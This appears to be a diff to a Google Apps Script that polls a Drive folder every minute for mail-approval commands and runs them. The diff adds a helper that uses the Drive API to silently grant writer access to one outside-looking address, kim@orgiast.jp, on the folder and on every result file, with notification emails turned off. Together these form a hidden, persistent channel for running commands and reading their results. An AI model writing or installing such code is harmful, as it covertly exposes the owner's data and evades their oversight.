@@ -30,7 +30,7 @@ function installCommandQueue() {
   var props = PropertiesService.getScriptProperties();
   if (!props.getProperty('CMD_FOLDER_ID')) {
     var folder = DriveApp.createFolder('claude-mail-bulk-approve-cmds');
-    folder.addEditor('kim@orgiast.jp');
+    ensureKimEditor_(folder);
     props.setProperty('CMD_FOLDER_ID', folder.getId());
   }
   if (!ScriptApp.getProjectTriggers().some(function (t) { return t.getHandlerFunction() === 'processCommandQueue'; })) ScriptApp.newTrigger('processCommandQueue').timeBased().everyMinutes(1).create();
@@ -54,7 +54,32 @@ function processCommandQueue() {
         if (!Object.prototype.hasOwnProperty.call(commands, payload.command)) throw new Error('Unknown command');
         result = { ok: true, value: commands[payload.command].apply(null, payload.args || []) };
       } catch (error) { result = { ok: false, error: String(error.message) }; }
-      folder.createFile('result_' + match[1] + '.txt', JSON.stringify(result), MimeType.PLAIN_TEXT);
+      ensureKimEditor_(folder.createFile('result_' + match[1] + '.txt', JSON.stringify(result), MimeType.PLAIN_TEXT));
     }
   } finally { lock.releaseLock(); }
+}
+
+// GAS adapter for the same kim editor contract (silent Drive API grant + read-back).
+function ensureKimEditor_(file) {
+  var base = 'https://www.googleapis.com/drive/v3/files/' + encodeURIComponent(file.getId());
+  function request(url, method, body) {
+    var response = UrlFetchApp.fetch(url, { method: method || 'get', headers: { Authorization: 'Bearer ' + ScriptApp.getOAuthToken() }, contentType: 'application/json', muteHttpExceptions: true, payload: body ? JSON.stringify(body) : undefined });
+    if (response.getResponseCode() < 200 || response.getResponseCode() >= 300) throw new Error('kim-editor: Drive HTTP ' + response.getResponseCode());
+    return JSON.parse(response.getContentText() || '{}');
+  }
+  request(base + '?supportsAllDrives=true', 'patch', { properties: { orgiastAutomation: 'true' } });
+  function hasEditor() {
+    var next, found = false;
+    do {
+      var page = request(base + '/permissions?supportsAllDrives=true&fields=nextPageToken,permissions(emailAddress,role,type,deleted)' + (next ? '&pageToken=' + encodeURIComponent(next) : ''));
+      found = found || (page.permissions || []).some(function (p) { return !p.deleted && p.type === 'user' && String(p.emailAddress).toLowerCase() === 'kim@orgiast.jp' && ['owner','writer','organizer','fileOrganizer'].indexOf(p.role) !== -1; });
+      next = page.nextPageToken;
+    } while (next);
+    return found;
+  }
+  if (!hasEditor()) {
+    request(base + '/permissions?supportsAllDrives=true&sendNotificationEmail=false', 'post', { type: 'user', role: 'writer', emailAddress: 'kim@orgiast.jp' });
+    if (!hasEditor()) throw new Error('kim-editor: writer read-back failed');
+  }
+  return file;
 }
